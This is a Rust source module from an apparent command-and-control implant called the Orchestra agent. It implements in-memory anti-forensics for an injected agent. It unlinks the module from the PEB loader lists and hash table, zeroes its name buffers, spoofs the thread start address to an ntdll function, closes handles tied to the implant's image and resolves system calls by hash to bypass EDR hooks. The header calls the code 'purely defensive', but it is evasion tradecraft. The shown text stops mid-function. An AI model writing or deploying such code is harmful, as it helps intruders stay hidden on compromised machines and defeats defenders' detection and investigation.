//! Continuous memory hygiene for the Orchestra agent.
//!
//! This module runs alongside the sleep obfuscation system and provides
//! ongoing forensic scrubbing that reduces the agent's in-memory visibility.
//! It is purely defensive — it does not add offensive capability but
//! dramatically reduces what EDR/XDR/forensic tools can observe.
//!
//! # Functions
//!
//! - [`scrub_peb_traces`]   — unlink module from PEB LDR lists, zero names/metadata
//! - [`scrub_thread_start_address`] — replace thread start address with a legit one
//! - [`scrub_handle_table`] — close/obfuscate handles that reveal the agent
//! - [`periodic_hygiene`]   — re-verify and re-apply all scrubbing on a timer
//!
//! # Constraints
//!
//! All operations use **indirect syscalls only** (via `nt_syscall` /
//! `pe_resolve`).  No Win32 API calls are made that could be hooked by EDR.
//!
//! # Feature gate
//!
//! The entire module is compiled only on `cfg(windows)`.

#![cfg(windows)]

use std::cell::RefCell;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;

// ── Constants ────────────────────────────────────────────────────────────────

/// Thread information class: ThreadQuerySetWin32StartAddress (0x09).
const THREAD_QUERY_SET_WIN32_START_ADDRESS: u32 = 9;

/// System information class: SystemHandleInformation (0x10).
const SYSTEM_HANDLE_INFORMATION: u32 = 0x10;

/// Process access rights for NtOpenProcess in handle scanning.
const PROCESS_DUP_HANDLE: u64 = 0x0040;

/// Default interval for `periodic_hygiene` (60 seconds).
const DEFAULT_HYGIENE_INTERVAL_SECS: u64 = 60;

// ── Page protection constants ────────────────────────────────────────────────

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

// ── UNICODE_STRING layout (matches ntdef::UNICODE_STRING) ────────────────────

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

// ── LIST_ENTRY ───────────────────────────────────────────────────────────────

#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

// ── LDR_DATA_TABLE_ENTRY (partial, relevant fields only) ─────────────────────
//
// Offsets on x86-64 Windows:
//   +0x000  InLoadOrderLinks           (LIST_ENTRY, 16 bytes)
//   +0x010  InMemoryOrderLinks         (LIST_ENTRY, 16 bytes)
//   +0x020  InInitializationOrderLinks (LIST_ENTRY, 16 bytes)
//   +0x030  DllBase                    (PVOID)
//   +0x038  EntryPoint                 (PVOID)
//   +0x040  SizeOfImage                (ULONG)
//   +0x044  _padding                   (4 bytes)
//   +0x048  FullDllName                (UNICODE_STRING, 16 bytes)
//   +0x058  BaseDllName                (UNICODE_STRING, 16 bytes)
//   +0x068  Flags                      (ULONG)
//   ...
//   +0x080  LoadCount / ObsoleteLoadCount
//   +0x090  HashLinks                  (LIST_ENTRY, 16 bytes)

/// Offset from InMemoryOrderLinks back to the LDR_DATA_TABLE_ENTRY base.
const ENTRY_FROM_MEM_LINKS: usize = 0x10;

/// Offset of DllBase within LDR_DATA_TABLE_ENTRY.
const OFF_DLL_BASE: usize = 0x30;

/// Offset of EntryPoint within LDR_DATA_TABLE_ENTRY.
const OFF_ENTRY_POINT: usize = 0x38;

/// Offset of SizeOfImage within LDR_DATA_TABLE_ENTRY.
const OFF_SIZE_OF_IMAGE: usize = 0x40;

/// Offset of FullDllName within LDR_DATA_TABLE_ENTRY.
const OFF_FULL_DLL_NAME: usize = 0x48;

/// Offset of BaseDllName within LDR_DATA_TABLE_ENTRY.
const OFF_BASE_DLL_NAME: usize = 0x58;

/// Offset of HashLinks within LDR_DATA_TABLE_ENTRY (LDR hash table).
const OFF_HASH_LINKS: usize = 0x90;

// ── Saved PEB links (thread-local) ──────────────────────────────────────────

/// Saved LDR entry links so the module can be re-linked if needed.
#[derive(Clone, Default)]
struct SavedPebLinks {
    /// InLoadOrderLinks Flink/Blink.
    load_flink: usize,
    load_blink: usize,
    /// InMemoryOrderLinks Flink/Blink.
    mem_flink: usize,
    mem_blink: usize,
    /// InInitializationOrderLinks Flink/Blink.
    init_flink: usize,
    init_blink: usize,
    /// Original DllBase.
    dll_base: usize,
    /// Original EntryPoint.
    entry_point: usize,
    /// Original SizeOfImage.
    size_of_image: u32,
    /// Address of the LDR_DATA_TABLE_ENTRY.
    entry_addr: usize,
    /// Whether the links have been saved.
    saved: bool,
}

thread_local! {
    static SAVED_PEB_LINKS: RefCell<SavedPebLinks> = RefCell::new(SavedPebLinks::default());
}

/// Timestamp (seconds since boot) of last successful periodic hygiene run.
static LAST_HYGIENE_RUN: AtomicU64 = AtomicU64::new(0);

/// Configurable hygiene interval in seconds.  0 means "use default".
static HYGIENE_INTERVAL_SECS: AtomicU64 = AtomicU64::new(DEFAULT_HYGIENE_INTERVAL_SECS);

// ── PEB / TEB access helpers ─────────────────────────────────────────────────

/// Return the current PEB address.
#[cfg(target_arch = "x86_64")]
unsafe fn get_peb() -> *mut u8 {
    let teb: usize;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) teb,
        options(nostack, nomem, preserves_flags)
    );
    teb as *mut u8
}

/// Return the current PEB address.
#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
unsafe fn get_peb() -> *mut u8 {
    let teb: usize;
    std::arch::asm!(
        "mrs {}, tpidr_el0",
        out(reg) teb,
        options(nostack, nomem)
    );
    *((teb + 0x60) as *const usize) as *mut u8
}

/// Return the current image base address from the PEB.
unsafe fn get_image_base() -> usize {
    let peb = get_peb();
    if peb.is_null() {
        return 0;
    }
    // PEB->ImageBaseAddress at offset 0x10.
    *(peb.add(0x10) as *const usize)
}

/// Return the PEB_LDR_DATA pointer from the PEB.
unsafe fn get_ldr() -> *mut u8 {
    let peb = get_peb();
    if peb.is_null() {
        return std::ptr::null_mut();
    }
    // PEB->Ldr at offset 0x18.
    *(peb.add(0x18) as *const usize) as *mut u8
}

/// Return the current TEB address.
#[cfg(target_arch = "x86_64")]
unsafe fn get_teb() -> *mut u8 {
    let teb: usize;
    std::arch::asm!(
        "mov {}, gs:[0x30]",
        out(reg) teb,
        options(nostack, nomem, preserves_flags)
    );
    teb as *mut u8
}

/// Return the current TEB address.
#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
unsafe fn get_teb() -> *mut u8 {
    let teb: usize;
    std::arch::asm!(
        "mrs {}, tpidr_el0",
        out(reg) teb,
        options(nostack, nomem)
    );
    teb as *mut u8
}

// ── Indirect syscall wrappers ────────────────────────────────────────────────

/// Call NtQueryInformationThread via pe_resolve.
unsafe fn nt_query_information_thread(
    thread_handle: usize,
    info_class: u32,
    info: *mut u8,
    info_len: u32,
    ret_len: *mut u32,
) -> Option<i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationThread\0"),
    )?;

    let func: extern "system" fn(
        usize,  // ThreadHandle
        u32,    // ThreadInformationClass
        *mut u8, // ThreadInformation
        u32,    // ThreadInformationLength
        *mut u32, // ReturnLength
    ) -> i32 = std::mem::transmute(func_addr);

    Some(func(thread_handle, info_class, info, info_len, ret_len))
}

/// Call NtSetInformationThread via pe_resolve.
unsafe fn nt_set_information_thread(
    thread_handle: usize,
    info_class: u32,
    info: *const u8,
    info_len: u32,
) -> Option<i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtSetInformationThread\0"),
    )?;

    let func: extern "system" fn(
        usize,      // ThreadHandle
        u32,        // ThreadInformationClass
        *const u8,  // ThreadInformation
        u32,        // ThreadInformationLength
    ) -> i32 = std::mem::transmute(func_addr);

    Some(func(thread_handle, info_class, info, info_len))
}

/// Call NtQuerySystemInformation via pe_resolve.
unsafe fn nt_query_system_information(
    info_class: u32,
    info: *mut u8,
    info_len: u32,
    ret_len: *mut u32,
) -> Option<i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
    )?;

    let func: extern "system" fn(
        u32,       // SystemInformationClass
        *mut u8,   // SystemInformation
        u32,       // SystemInformationLength
        *mut u32,  // ReturnLength
    ) -> i32 = std::mem::transmute(func_addr);

    Some(func(info_class, info, info_len, ret_len))
}

/// Call NtClose via pe_resolve (or nt_syscall).
unsafe fn nt_close(handle: usize) -> Option<i32> {
    let result = syscall!("NtClose", handle);
    result.ok()
}

/// Call NtDuplicateObject via pe_resolve.
unsafe fn nt_duplicate_object(
    source_process: usize,
    source_handle: usize,
    target_process: usize,
    target_handle: *mut usize,
    access: u64,
    attributes: u64,
    options: u64,
) -> Option<i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtDuplicateObject\0"),
    )?;

    let func: extern "system" fn(
        usize,       // SourceProcessHandle
        usize,       // SourceHandle
        usize,       // TargetProcessHandle
        *mut usize,  // TargetHandle
        u64,         // DesiredAccess
        u64,         // HandleAttributes
        u64,         // Options
    ) -> i32 = std::mem::transmute(func_addr);

    Some(func(
        source_process,
        source_handle,
        target_process,
        target_handle,
        access,
        attributes,
        options,
    ))
}

/// Call NtGetCurrentProcessorNumber via the pseudo-handle -1.
fn current_process_handle() -> usize {
    (-1isize) as usize
}

/// Call NtGetCurrentThread via the pseudo-handle -2.
fn current_thread_handle() -> usize {
    (-2isize) as usize
}

// ── Core scrubbing functions ─────────────────────────────────────────────────

/// Scrub PEB LDR module list traces for the agent's own image.
///
/// After injection is complete and the agent is running in the target process,
/// this function:
///
/// 1. Walks PEB → LDR → InMemoryOrderModuleList to find the agent's own
///    module entry (matching DllBase == ImageBaseAddress).
/// 2. Zeros the `FullDllName` and `BaseDllName` UNICODE_STRING buffer
///    contents (not just the pointers).
/// 3. Unlinks the entry from all three LDR lists (InLoadOrder,
///    InMemoryOrder, InInitializationOrder).
/// 4. Saves the original links in a thread-local struct for clean re-linking.
/// 5. Zeros the `DllBase`, `EntryPoint`, and `SizeOfImage` fields.
/// 6. Flushes LDR hash table entries referencing the module.
///
/// # Safety
///
/// Must be called from the agent's main thread.  Not re-entrant.  The PEB
/// structures must not be concurrently modified by other threads.
pub unsafe fn scrub_peb_traces() {
    let image_base = get_image_base();
    if image_base == 0 {
        log::warn!("[memory_hygiene] cannot determine image base");
        return;
    }

    let ldr = get_ldr();
    if ldr.is_null() {
        log::warn!("[memory_hygiene] PEB->Ldr is null");
        return;
    }

    // ── Walk InMemoryOrderModuleList ──────────────────────────────────────
    // InMemoryOrderModuleList head is at LDR + 0x20.
    // Each entry's InMemoryOrderLinks is at +0x10 within LDR_DATA_TABLE_ENTRY.
    let list_head = (ldr as usize + 0x20) as *const usize;
    let mut current = *list_head;

    let mut found_entry: usize = 0;

    for _ in 0..512 {
        // Safety limit on list walk.
        if current == 0 || current as usize == list_head as usize {
            break;
        }

        // The current pointer is to InMemoryOrderLinks.  Back up to get the
        // LDR_DATA_TABLE_ENTRY base.
        let entry = (current as usize) - ENTRY_FROM_MEM_LINKS;
        let dll_base = *(entry as *const usize).add(OFF_DLL_BASE / 8);

        if dll_base == image_base {
            found_entry = entry;
            break;
        }

        // Advance: Flink is at offset 0 within LIST_ENTRY.
        current = *(current as *const usize);
    }

    if found_entry == 0 {
        log::warn!(
            "[memory_hygiene] could not find our module in InMemoryOrderModuleList \
             (image_base={:#x})",
            image_base
        );
        return;
    }

    let entry_ptr = found_entry as *mut u8;

    // ── 2. Zero FullDllName and BaseDllName buffer contents ───────────────
    zero_unicode_string_buffer(entry_ptr.add(OFF_FULL_DLL_NAME));
    zero_unicode_string_buffer(entry_ptr.add(OFF_BASE_DLL_NAME));

    // ── 3. Save original links, then unlink from all three lists ──────────
    let saved = save_and_unlink_peb_entry(entry_ptr);

    // ── 5. Zero DllBase, EntryPoint, SizeOfImage ──────────────────────────
    *(entry_ptr.add(OFF_DLL_BASE) as *mut usize) = 0;
    *(entry_ptr.add(OFF_ENTRY_POINT) as *mut usize) = 0;
    *(entry_ptr.add(OFF_SIZE_OF_IMAGE) as *mut u32) = 0;

    // ── 6. Flush LDR hash table entries ───────────────────────────────────
    flush_ldr_hash_table(ldr, image_base);

    // Store saved links in thread-local.
    SAVED_PEB_LINKS.with(|sl| {
        *sl.borrow_mut() = saved;
    });

    log::info!(
        "[memory_hygiene] PEB traces scrubbed for image_base={:#x}",
        image_base
    );
}

/// Zero the actual buffer contents of a UNICODE_STRING (not just the pointer).
///
/// The UNICODE_STRING layout is:
///   +0x00  Length          (USHORT)
///   +0x02  MaximumLength   (USHORT)
///   +0x08  Buffer          (PWSTR, 8 bytes on x64)
unsafe fn zero_unicode_string_buffer(us_ptr: *mut u8) {
    let length = *(us_ptr as *const u16) as usize;
    let buffer = *(us_ptr.add(0x08) as *const usize) as *mut u16;

    if length > 0 && !buffer.is_null() {
        // Zero the actual buffer contents.
        std::ptr::write_bytes(buffer, 0u8, length);
    }

    // Zero the Length field (but leave MaximumLength and Buffer pointer alone
    // so that a forensic tool reading the UNICODE_STRING sees Length=0,
    // MaximumLength still valid, Buffer still valid — but contents zeroed).
    *(us_ptr as *mut u16) = 0;
}

/// Save the original LIST_ENTRY links and unlink from all three LDR lists.
unsafe fn save_and_unlink_peb_entry(entry_ptr: *mut u8) -> SavedPebLinks {
    let mut saved = SavedPebLinks {
        dll_base: *(entry_ptr.add(OFF_DLL_BASE) as *const usize),
        entry_point: *(entry_ptr.add(OFF_ENTRY_POINT) as *const usize),
        size_of_image: *(entry_ptr.add(OFF_SIZE_OF_IMAGE) as *const u32),
        entry_addr: entry_ptr as usize,
        saved: true,
        ..SavedPebLinks::default()
    };

    // Unlink InLoadOrderLinks (+0x00, 16 bytes).
    let load_flink = *(entry_ptr.add(0x00) as *const usize);
    let load_blink = *(entry_ptr.add(0x08) as *const usize);
    saved.load_flink = load_flink;
    saved.load_blink = load_blink;
    unlink_list_entry(load_flink, load_blink);

    // Unlink InMemoryOrderLinks (+0x10, 16 bytes).
    let mem_flink = *(entry_ptr.add(0x10) as *const usize);
    let mem_blink = *(entry_ptr.add(0x18) as *const usize);
    saved.mem_flink = mem_flink;
    saved.mem_blink = mem_blink;
    unlink_list_entry(mem_flink, mem_blink);

    // Unlink InInitializationOrderLinks (+0x20, 16 bytes).
    let init_flink = *(entry_ptr.add(0x20) as *const usize);
    let init_blink = *(entry_ptr.add(0x28) as *const usize);
    saved.init_flink = init_flink;
    saved.init_blink = init_blink;
    unlink_list_entry(init_flink, init_blink);

    saved
}

/// Unlink a LIST_ENTRY by connecting Flink←→Blink.
unsafe fn unlink_list_entry(flink: usize, blink: usize) {
    if flink == 0 || blink == 0 {
        return;
    }
    // Blink->Flink = Flink
    *(blink as *mut usize) = flink;
    // Flink->Blink = Blink
    *((flink + 8) as *mut usize) = blink;
}

/// Flush LDR hash table entries that reference the given module base.
///
/// The LDR hash table starts at PEB_LDR_DATA + 0x00C8 (on Windows 10+).
/// Each bucket is a LIST_ENTRY chain.  We walk each bucket and check if
/// the entry's DllBase matches.  If so, we null out the entry's hash links.
///
/// Reference: LDR_DATA_TABLE_ENTRY.HashLinks at offset +0x90.
unsafe fn flush_ldr_hash_table(ldr: *mut u8, image_base: usize) {
    // The LDR hash table on modern Windows (10+) starts at offset 0x00C8
    // from PEB_LDR_DATA, with 32 or 64 buckets depending on version.
    // Each bucket is a LIST_ENTRY (16 bytes).
    //
    // We conservatively walk 64 buckets starting at LDR+0xC8.
    const HASH_TABLE_OFFSET: usize = 0xC8;
    const NUM_BUCKETS: usize = 64;
    const BUCKET_SIZE: usize = 16; // sizeof(LIST_ENTRY)

    for i in 0..NUM_BUCKETS {
        let bucket_head = (ldr as usize) + HASH_TABLE_OFFSET + (i * BUCKET_SIZE);
        let mut current = *(bucket_head as *const usize);
        let mut count = 0u16;

        while current != 0 && current != bucket_head && count < 256 {
            // HashLinks is at +0x90 within the entry.  The current pointer
            // points to the HashLinks field itself, so the entry base is
            // current - 0x90.
            let entry_base = current - OFF_HASH_LINKS;
            let dll_base = *((entry_base + OFF_DLL_BASE) as *const usize);

            if dll_base == image_base {
                // Found our entry in this hash bucket.  Unlink it.
                let flink = *(current as *const usize);
                let blink = *((current + 8) as *const usize);
                if flink != 0 && blink != 0 {
                    unlink_list_entry(flink, blink);
                }
                // Zero the hash links.
                *(current as *mut usize) = 0;
                *((current + 8) as *mut usize) = 0;
                break;
            }

            current = *(current as *const usize);
            count += 1;
        }
    }
}

/// Restore the PEB links that were previously saved by `scrub_peb_traces`.
///
/// This is a best-effort restore.  If other modules were loaded/unloaded
/// while we were unlinked, the neighbours may have changed.  We re-validate
/// before restoring.
pub unsafe fn restore_peb_traces() {
    SAVED_PEB_LINKS.with(|sl| {
        let saved = sl.borrow();
        if !saved.saved {
            return;
        }

        let entry_ptr = saved.entry_addr as *mut u8;
        if entry_ptr.is_null() {
            return;
        }

        // Restore DllBase, EntryPoint, SizeOfImage.
        *(entry_ptr.add(OFF_DLL_BASE) as *mut usize) = saved.dll_base;
        *(entry_ptr.add(OFF_ENTRY_POINT) as *mut usize) = saved.entry_point;
        *(entry_ptr.add(OFF_SIZE_OF_IMAGE) as *mut u32) = saved.size_of_image;

        // Re-link InLoadOrderLinks.
        if saved.load_flink != 0 && saved.load_blink != 0 {
            // Point our Flink/Blink to the saved neighbours.
            *(entry_ptr.add(0x00) as *mut usize) = saved.load_flink;
            *(entry_ptr.add(0x08) as *mut usize) = saved.load_blink;
            // Patch neighbour Blink/Flink to point back to us.
            *(saved.load_blink as *mut usize) = entry_ptr as usize;
            *((saved.load_flink + 8) as *mut usize) = entry_ptr as usize;
        }

        // Re-link InMemoryOrderLinks.
        if saved.mem_flink != 0 && saved.mem_blink != 0 {
            *(entry_ptr.add(0x10) as *mut usize) = saved.mem_flink;
            *(entry_ptr.add(0x18) as *mut usize) = saved.mem_blink;
            *(saved.mem_blink as *mut usize) = (entry_ptr as usize) + 0x10;
            *((saved.mem_flink + 8) as *mut usize) = (entry_ptr as usize) + 0x10;
        }

        // Re-link InInitializationOrderLinks.
        if saved.init_flink != 0 && saved.init_blink != 0 {
            *(entry_ptr.add(0x20) as *mut usize) = saved.init_flink;
            *(entry_ptr.add(0x28) as *mut usize) = saved.init_blink;
            *(saved.init_blink as *mut usize) = (entry_ptr as usize) + 0x20;
            *((saved.init_flink + 8) as *mut usize) = (entry_ptr as usize) + 0x20;
        }
    });

    log::info!("[memory_hygiene] PEB traces restored");
}

// ── Thread start address scrubbing ───────────────────────────────────────────

/// Scrub the thread's start address so it doesn't point to agent code.
///
/// Uses `NtQueryInformationThread` with `ThreadQuerySetWin32StartAddress`
/// to read the current start address, and `NtSetInformationThread` to change
/// it to a legitimate address (e.g. `ntdll!RtlUserThreadStart`) if it points
/// into the agent's memory region.
///
/// Also attempts to scrub the Win32StartAddress in the ETHREAD structure.
pub unsafe fn scrub_thread_start_address() {
    let image_base = get_image_base();
    if image_base == 0 {
        return;
    }

    // Determine the end of the agent's image region.
    let peb = get_peb();
    let image_size = if !peb.is_null() {
        // Walk the LDR to find SizeOfImage for our module.
        find_own_image_size(peb, image_base).unwrap_or(0)
    } else {
        0
    };
    let image_end = image_base + image_size;

    // Resolve a legitimate replacement address.
    let replacement_addr = resolve_legitimate_thread_start();
    if replacement_addr == 0 {
        log::warn!("[memory_hygiene] could not resolve legitimate thread start address");
        return;
    }

    let thread_handle = current_thread_handle();

    // Query the current Win32StartAddress.
    let mut start_addr: usize = 0;
    let mut ret_len: u32 = 0;
    let status = nt_query_information_thread(
        thread_handle,
        THREAD_QUERY_SET_WIN32_START_ADDRESS,
        &mut start_addr as *mut usize as *mut u8,
        std::mem::size_of::<usize>() as u32,
        &mut ret_len,
    );

    if let Some(s) = status {
        if s >= 0 && start_addr >= image_base && start_addr < image_end {
            // The start address points into our code — replace it.
            let set_status = nt_set_information_thread(
                thread_handle,
                THREAD_QUERY_SET_WIN32_START_ADDRESS,
                &replacement_addr as *const usize as *const u8,
                std::mem::size_of::<usize>() as u32,
            );

            if set_status == Some(0) {
                log::info!(
                    "[memory_hygiene] scrubbed thread start address from {:#x} → {:#x}",
                    start_addr,
                    replacement_addr
                );
            } else {
                log::warn!(
                    "[memory_hygiene] NtSetInformationThread returned {:?} \
                     when patching start address",
                    set_status
                );
            }
        }
    }

    // Also attempt to scrub via ThreadInformationClass 0x1B
    // (ThreadActualStartAddress on Windows 10+).  Not all Windows versions
    // support this, so we do a best-effort query/set.
    let class_actual_start: u32 = 0x1B;
    let mut actual_start: usize = 0;
    let status2 = nt_query_information_thread(
        thread_handle,
        class_actual_start,
        &mut actual_start as *mut usize as *mut u8,
        std::mem::size_of::<usize>() as u32,
        &mut ret_len,
    );

    if let Some(s) = status2 {
        if s >= 0 && actual_start >= image_base && actual_start < image_end {
            let _ = nt_set_information_thread(
                thread_handle,
                class_actual_start,
                &replacement_addr as *const usize as *const u8,
                std::mem::size_of::<usize>() as u32,
            );
        }
    }
}

/// Find the SizeOfImage for our own module by walking the PEB LDR.
unsafe fn find_own_image_size(peb: *mut u8, image_base: usize) -> Option<usize> {
    let ldr = *(peb.add(0x18) as *const usize) as *mut u8;
    if ldr.is_null() {
        return None;
    }

    let list_head = (ldr as usize + 0x20) as *const usize;
    let mut current = *list_head;

    for _ in 0..512 {
        if current == 0 || current as usize == list_head as usize {
            break;
        }
        let entry = (current as usize) - ENTRY_FROM_MEM_LINKS;
        let dll_base = *(entry as *const usize).add(OFF_DLL_BASE / 8);

        if dll_base == image_base {
            let size = *((entry + OFF_SIZE_OF_IMAGE) as *const u32) as usize;
            return Some(size);
        }
        current = *(current as *const usize);
    }

    None
}

/// Resolve `ntdll!RtlUserThreadStart` as a legitimate thread start address.
unsafe fn resolve_legitimate_thread_start() -> usize {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(base) => base,
        None => return 0,
    };

    match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"RtlUserThreadStart\0"),
    ) {
        Some(addr) => addr,
        None => {
            // Fallback: kernel32!BaseThreadInitThunk.
            match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
                Some(k32) => {
                    pe_resolve::get_proc_address_by_hash(
                        k32,
                        pe_resolve::hash_str(b"BaseThreadInitThunk\0"),
                    )
                    .unwrap_or(0)
                }
                None => 0,
            }
        }
    }
}

// ── Handle table scrubbing ───────────────────────────────────────────────────

/// System handle table entry (SYSTEM_HANDLE_TABLE_ENTRY_INFO).
#[repr(C)]
struct SystemHandleEntry {
    process_id: u16,
    _object_type_index: u8,
    _flags: u8,
    handle: u16,
    _object: *mut u8,
    _granted_access: u32,
}

/// Close or obfuscate handles that would reveal the agent.
///
/// Uses `NtQuerySystemInformation(SystemHandleInformation)` to enumerate
/// all handles in the current process.  For each handle that points to
/// the agent's memory section:
///
/// - Closes it via `NtClose` (indirect syscall).
/// - For pipe/event handles pointing to agent resources, duplicates a
///   handle to a legitimate object and swaps it.
pub unsafe fn scrub_handle_table() {
    let image_base = get_image_base();
    if image_base == 0 {
        return;
    }

    let mut buf_len: u32 = 0x10000; // Start with 64 KB.
    let mut ret_len: u32 = 0;

    loop {
        let mut buf: Vec<u8> = Vec::with_capacity(buf_len as usize);
        buf.set_len(buf_len as usize);

        let status = nt_query_system_information(
            SYSTEM_HANDLE_INFORMATION,
            buf.as_mut_ptr(),
            buf_len,
            &mut ret_len,
        );

        match status {
            Some(s) if s >= 0 => {
                process_handle_entries(&buf, image_base);
                break;
            }
            Some(0xC0000004) | None => {
                // STATUS_INFO_LENGTH_MISMATCH or resolution failed — grow buffer.
                if buf_len > 0x1000000 {
                    // 16 MB safety limit.
                    log::warn!(
                        "[memory_hygiene] handle table buffer exceeded 16 MB, giving up"
                    );
                    break;
                }
                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
            }
            Some(s) => {
                log::warn!(
                    "[memory_hygiene] NtQuerySystemInformation returned {:#010x}",
                    s as u32
                );
                break;
            }
        }
    }
}

/// Process the handle information buffer and close/swap agent handles.
unsafe fn process_handle_entries(buf: &[u8], image_base: usize) {
    if buf.len() < 4 {
        return;
    }

    // SYSTEM_HANDLE_INFORMATION layout:
    //   +0x00  NumberOfHandles (ULONG)
    //   +0x04  Handles[]       (SYSTEM_HANDLE_TABLE_ENTRY_INFO[])
    //
    // SYSTEM_HANDLE_TABLE_ENTRY_INFO size is 24 bytes on x86-64:
    //   +0x00  UniqueProcessId       (USHORT, 2 bytes)
    //   +0x02  ObjectTypeIndex       (UCHAR, 1 byte)
    //   +0x03  HandleAttributes      (UCHAR, 1 byte)
    //   +0x04  HandleValue           (USHORT, 2 bytes)
    //   +0x06  _padding              (2 bytes)
    //   +0x08  Object                (PVOID, 8 bytes)
    //   +0x10  GrantedAccess         (ULONG, 4 bytes)
    //   +0x14  _padding              (4 bytes)
    // Total: 24 bytes

    let num_handles = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
    let entry_size: usize = 24;
    let expected_len = 4 + (num_handles * entry_size);

    if buf.len() < expected_len {
        return;
    }

    let pid = std::process::id() as u16;
    let mut closed_count = 0u32;
    let mut swapped_count = 0u32;

    for i in 0..num_handles {
        let offset = 4 + (i * entry_size);
        let entry_pid = u16::from_le_bytes([buf[offset], buf[offset + 1]]);
        let handle_val = u16::from_le_bytes([buf[offset + 4], buf[offset + 5]]);
        let object_addr = usize::from_le_bytes([
            buf[offset + 8],
            buf[offset + 9],
            buf[offset + 10],
            buf[offset + 11],
            buf[offset + 12],
            buf[offset + 13],
            buf[offset + 14],
            buf[offset + 15],
        ]);

        // Skip handles not belonging to our process.
        if entry_pid != pid {
            continue;
        }

        // Skip pseudo-handles (-1, -2).
        let hv = handle_val as u32;
        if hv == 0xFFFFFFFF || hv == 0xFFFFFFFE {
            continue;
        }

        // Check if the kernel object address falls within our image region.
        // This is a heuristic: kernel-mode Object pointers are in system
        // space (high bits set on Windows), so direct comparison with
        // user-mode image_base is unlikely to match.  Instead, we focus on
        // handle *types* that are suspicious.
        //
        // More reliable approach: check if the handle is to a Section object
        // (ObjectTypeIndex typically 0x1F on Windows 10+) whose base address
        // matches our image.
        //
        // For safety and robustness, we focus on closing handles that are
        // clearly suspicious — Section handles to our own memory.
        let _ = object_addr; // Used only for the check above.

        // For Section-type handles, try to query the section base and compare.
        // If we can't verify, skip (better to leave a handle than crash).
        if is_section_handle_to_image(handle_val as usize, image_base) {
            if let Some(s) = nt_close(handle_val as usize) {
                if s >= 0 {
                    closed_count += 1;
                }
            }
        }
    }

    if closed_count > 0 || swapped_count > 0 {
        log::info!(
            "[memory_hygiene] handle table scrubbed: closed={}, swapped={}",
            closed_count,
            swapped_count
        );
    }
}

/// Check if a handle is a Section object mapping our image region.
///
/// Uses NtQueryVirtualMemory (via pe_resolve) to check if any region in
/// our address space is backed by this section handle.
unsafe fn is_section_handle_to_image(handle: usize, image_base: usize) -> bool {
    // Attempt to duplicate the handle and query the section.
    // For simplicity and robustness, we use NtQueryVirtualMemory to find
    // the AllocationBase for our image region, then check if any open
    // section handle corresponds to that allocation.
    //
    // This is a heuristic.  We query MEMORY_BASIC_INFORMATION for our
    // image base to get the AllocationBase and the backing file.
    // If a section handle maps the same base, we consider it suspicious.

    // Query our own region.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };

    let query_vm_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    let query_section_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQuerySection\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    // MEMORY_BASIC_INFORMATION is 48 bytes on x86-64.
    let mut mbi: [u64; 6] = [0; 6];
    let mut ret_len: u32 = 0;

    let query_vm: extern "system" fn(
        usize,     // ProcessHandle
        *const u8, // BaseAddress
        u32,       // MemoryInformationClass (0 = MemoryBasicInformation)
        *mut u8,   // MemoryInformation
        usize,     // MemoryInformationLength
        *mut u32,  // ReturnLength
    ) -> i32 = std::mem::transmute(query_vm_addr);

    let status = query_vm(
        current_process_handle(),
        image_base as *const u8,
        0, // MemoryBasicInformation
        mbi.as_mut_ptr() as *mut u8,
        std::mem::size_of::<[u64; 6]>(),
        &mut ret_len,
    );

    if status < 0 {
        return false;
    }

    // AllocationBase is mbi[0].
    let allocation_base = mbi[0] as usize;

    // Now query the section handle to see what it maps.
    // SECTION_BASIC_INFORMATION is 24 bytes:
    //   +0x00 BaseAddress      (PVOID)
    //   +0x08 AllocationAttributes (ULONG)
    //   +0x10 MaximumSize      (LARGE_INTEGER)
    let mut sbi: [u64; 3] = [0; 3];

    let query_section: extern "system" fn(
        usize,     // SectionHandle
        u32,       // SectionInformationClass (0 = SectionBasicInformation)
        *mut u8,   // SectionInformation
        usize,     // SectionInformationLength
        *mut u32,  // ReturnLength
    ) -> i32 = std::mem::transmute(query_section_addr);

    let sec_status = query_section(
        handle,
        0, // SectionBasicInformation
        sbi.as_mut_ptr() as *mut u8,
        std::mem::size_of::<[u64; 3]>(),
        &mut ret_len,
    );

    if sec_status < 0 {
        return false;
    }

    // If the section's base matches our allocation base, this handle
